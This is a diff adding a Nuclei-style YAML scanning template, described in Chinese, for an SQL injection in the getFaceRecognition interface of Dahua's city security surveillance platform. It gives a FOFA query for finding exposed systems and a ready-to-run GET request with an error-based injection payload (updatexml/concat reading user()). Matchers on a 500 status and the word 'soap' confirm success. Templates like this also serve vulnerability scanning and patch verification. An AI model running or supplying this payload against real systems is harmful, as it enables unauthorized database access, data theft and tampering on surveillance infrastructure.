@@ -1,0 +1,28 @@
+id: dahua-security-getfacerecognition-sqli
+
+info:
+  name: 大华城市安防监控系统平台getFaceRecognition接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="dahua-DSS"
+          大华城市安防监控系统平台的getFaceRecognition接口存在SQL注入安全缺陷。攻击者可通过构造恶意SQL语句利用该漏洞，实现对数据库的未授权访问、数据篡改或敏感信息泄露，进而对系统安全构成严重威胁。
+  tags: 大华城市安防监控系统平台管理
+
+http:
+- raw:
+  - |
+    GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/1 HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'soap'
